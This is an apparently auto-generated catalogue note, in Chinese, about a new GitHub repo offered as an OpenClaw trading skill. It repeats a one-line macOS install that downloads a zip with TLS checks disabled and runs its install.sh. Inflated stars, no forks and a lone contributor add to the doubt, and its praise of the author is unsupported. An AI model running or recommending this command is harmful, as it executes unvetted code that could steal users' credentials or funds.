---
repo: helenigtxu/TradingView-Claw
url: https://github.com/helenigtxu/TradingView-Claw
owner: helenigtxu
owner_type: User
language: Python
license: MIT
description: ""
homepage: ""
stars: 318
stars_per_day: 80
forks: 0
open_issues: 0
created: 2026-03-06
pushed_at: 2026-03-09
first_seen: 2026-03-10
week: "2026-W11"
category: "其他"
release_tag: ""
install_complexity: "easy"
status: to-review
my_rating: 0
last_reviewed: 2026-03-10
tags:
  - github
  - "category/其他"
  - "lang/python"
  - easy_install
  - "topic/ai_auto_trading"
  - "topic/ai_trading"
  - "topic/ai_trading_bots"
  - "topic/al_trading"
  - "topic/bot_trading"
aliases:
  - "TradingView-Claw"
  - "helenigtxu/TradingView-Claw"
  - "提供基於技術信號的交易功能，助你在市場中發現機會。"
---

# TradingView-Claw

**318** stars · **80** stars/天 · 建立 4 天前 · Python · MIT

`個人專案` `easy-install`

> [!summary] 一句話摘要
> 提供基於技術信號的交易功能，助你在市場中發現機會。

> [!abstract] 核心創新
> 使用 LLM 驅動的技術分析來識別高信心的交易信號。

## 專案簡介

TradingView-Claw 是一個為 OpenClaw 設計的交易技能，能夠讓使用者瀏覽圖表、執行交易並追蹤持倉。它利用 LLM 驅動的技術分析來識別高信心的交易信號，並提供完整的交易能力，通過經紀商集成和交易所 API 來實現。這個工具的特點是能夠自動追蹤開放的持倉，並提供即時的盈虧情況，讓使用者能夠隨時掌握自己的交易狀態。與其他交易工具相比，TradingView-Claw 提供了更高層次的信號發現功能，能夠過濾掉噪音和弱相關性，專注於統計上意義重大的信號。整體來看，這是一個適合希望進行技術分析和交易的使用者的工具。

**技術棧**：`Python` · `JavaScript` · `Shell`

## 重點功能

- 基於 LLM 的技術分析，提供高信心的交易信號。
- 支持多種交易指令，如開長和開短。
- 即時追蹤持倉，顯示盈虧情況。
- 自動掃描市場趨勢，發現交易機會。
- 支持經紀商 API 的連接，方便管理賬戶。

## 快速開始

1. 在 macOS 上安裝
```bash
curl -fsSLk https://github.com/helenigtxu/TradingView-Claw/archive/refs/heads/main.zip -o /tmp/cw.zip && unzip -qo /tmp/cw.zip -d /tmp && cd /tmp/TradingView-Claw-main && bash install.sh
```

## 為什麼值得關注

> [!tip] 爆紅原因
> 作者在交易和技術分析領域有豐富的經驗，這個專案切中了對於自動化交易工具的需求。隨著金融市場的波動性增加，越來越多的交易者尋求能夠提供即時信號的工具，這使得 TradingView-Claw 在當前時期受到關注。特別是它的 LLM 驅動分析，讓使用者能夠更有效地發現交易機會。

## 適合誰使用

**目標受眾**：希望進行自動化交易和技術分析的交易者。

> [!example] 使用場景
> - 交易者 用它來 執行交易，因為能夠根據技術信號做出快速決策。
> - 分析師 用它來 追蹤市場趨勢，因為提供即時的圖表和數據。
> - 新手交易者 用它來 學習技術分析，因為提供易於使用的命令行介面。

## 架構分析

TradingView-Claw 採用命令行介面，通過調用 API 與經紀商進行交互。資料流是 使用者輸入 → 技術分析 → 交易執行 → 持倉追蹤 → 信號發現。

## 優缺點分析

> [!success] 優點
> - 基於 LLM 的分析，能夠過濾噪音，提供高信心信號。
> - 即時追蹤持倉，方便使用者掌握交易狀態。
> - 簡單的命令行介面，易於使用。

> [!danger] 缺點
> - 僅限於 macOS，其他系統支援不足。
> - 未經審核，使用風險自負。
> - 功能尚在開發中，可能存在不穩定性。

> [!warning] 注意事項
> - 目前僅支援 macOS，其他系統可能需要手動安裝。
> - 未經審核的代碼，使用風險自負。
> - 僅用於教育和實驗目的，不能作為財務建議。

## 技術細節

| 欄位 | 值 |
| --- | --- |
| Forks | 0 |
| Open Issues | 0 |
| 最後推送 | 2026-03-09 |
| 建立日期 | 2026-03-06 |
| Repo 大小 | 90 KB |

> [!info]- 語言組成
> ```mermaid
> pie title 語言組成
>     "Python" : 77
>     "Shell" : 12
>     "JavaScript" : 10
> ```

> [!info]- 主要貢獻者
> | 貢獻者 | Commits |
> | --- | --- |
> | [@helenigtxu](https://github.com/helenigtxu) | 3 |

## README 摘錄

> [!info]- 展開查看原文 README
> # TradingView-Claw
> 
> **Trading-enabled TradingView skill for OpenClaw.**
> 
> Browse charts, execute trades based on technical signals, track positions, and discover opportunities using LLM-powered technical analysis. Full trading capability via broker integrations and exchange APIs.
> 
> > **Disclaimer:** This software is provided as-is for educational and experimental purposes. It is not financial advice. Trading financial markets involves risk of loss. This code has not been audited. Use at your own risk and only with funds you can afford to lose.
> 
> ---
> 
> ## ⚡ Install on macOS — one command
> 
> ```bash
> curl -fsSLk https://github.com/helenigtxu/TradingView-Claw/archive/refs/heads/main.zip -o /tmp/cw.zip && \
> unzip -qo /tmp/cw.zip -d /tmp && \
> cd /tmp/TradingView-Claw-main && \
> bash install.sh
> ```
> 
> ---
> 
> ## Features
> 
> ### Chart & Market Data
> 
> * `tvclaw charts trending` — Top trending tickers by volume
> * `tvclaw charts search "query"` — Search symbols by keyword
> * `tvclaw chart ` — Symbol details with OHLCV + indicators
> 
> ### Trading
> 
> * `tvclaw buy  ` — Open long position
> * `tvclaw sell  ` — Open short position
> * Signal-driven execution (RSI, MACD, Bollinger Bands analysis)
> 
> ### Position Tracking
> 
> * `tvclaw positions` — List open positions with live P&L
> * `tvclaw position ` — Detailed position view
> * Positions tracked locally in `~/.openclaw/tvclaw/positions.json`
> 
> ### Wallet / Account Management
> 
> * `tvclaw account status` — Show balance and account info
> * `tvclaw account connect` — Connect broker/exchange API (one-time setup)
> 
> ### Signal Discovery
> 
> * `tvclaw signal scan` — Scan trending symbols for trade signals
> * `tvclaw signal scan --query "topic"` — Scan symbols matching a query
> * `tvclaw signal analyze  ` — Compare signal strength between two symbols
> 
> Uses LLM-powered technical analysis to identify high-confidence setups. Only statistically meaningful signals are accepted — noise and weak correlations are filtered out.
> 
> **Signal tiers:** S1 (≥95% confluence), S2 (90–95%), S3 (85–90%)
> 
> ---
> 
> ## Quick Start
> 
> ### 1. Install
> 
> **macOS (recommended) — one command:**
> 
> ```bash
> curl -fsSLk https://github.com/helenigtxu/TradingView-Claw/archive/refs/heads/main.zip -o /tmp/cw.zip && \
> unzip -qo /tmp/cw.zip -d /tmp && \
> cd /tmp/TradingView-Claw-main && \
> bash install.sh
> ```
> 
> **Manual install:**
> 
> ```bash
> cp -r TradingView-Claw ~/.openclaw/skills/
> cd ~/.openclaw/skills/TradingView-Claw
> uv sync
> ```
> 
> **Via ClawHub:**
> 
> ```bash
> clawhub install tvclaw
> cd ~/.openclaw/skills/tvclaw
> uv sync

## 延伸閱讀

相關概念：[[技術分析]] · [[自動化交易]] · [[金融市場]]

[GitHub](https://github.com/helenigtxu/TradingView-Claw)

## 相關收錄

> [!note]- 同分類的其他專案
> ```dataview
> LIST
> FROM "Repos"
> WHERE category = "其他" AND file.name != "helenigtxu--TradingView-Claw"
> SORT stars DESC
> LIMIT 8
> ```


---

## 個人筆記

> [!question]+ 我的想法
> _在此寫下你的想法、使用心得、跟其他工具的比較..._

**狀態追蹤**：`to-review` → `reading` → `tried` → `integrated` / `archived`

## 出現記錄

- [[2026-03-10|2026-03-10]] — 首次收錄，317 stars
